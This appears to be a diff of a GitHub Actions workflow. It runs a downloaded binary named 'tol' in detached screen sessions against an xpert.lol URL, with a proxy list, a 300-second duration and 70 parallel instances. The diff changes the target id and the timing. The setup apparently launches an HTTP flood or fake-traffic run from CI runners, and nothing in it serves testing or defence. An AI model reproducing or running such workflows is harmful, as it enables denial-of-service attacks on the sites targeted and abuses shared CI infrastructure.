@@ -34,11 +34,13 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x tol
+          screen -dms ve ./tol https://xpert.lol/6901966783-cc49097d-86e8-477d-94d7-6bb988cd3d07 300 1 1 90.txt 
+          screen -dms ve ./tol https://xpert.lol/6901966783-cc49097d-86e8-477d-94d7-6bb988cd3d07 300 1 1 90.txt 
+          screen -dms ve ./tol https://xpert.lol/6901966783-cc49097d-86e8-477d-94d7-6bb988cd3d07 300 1 1 90.txt 
+          sleep 300
           
-          screen -dms ve./tol https://xpert.lol/6901966783-b0b27814-a854-4152-93e8-e651ffa8fdf7 300 1 1 90.txt 
-          screen -dms ve./tol https://xpert.lol/6901966783-b0b27814-a854-4152-93e8-e651ffa8fdf7 300 1 1 90.txt 
-          screen -dms ve./tol https://xpert.lol/6901966783-b0b27814-a854-4152-93e8-e651ffa8fdf7 300 1 1 90.txt 
-          sleep 500
+          
+          
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
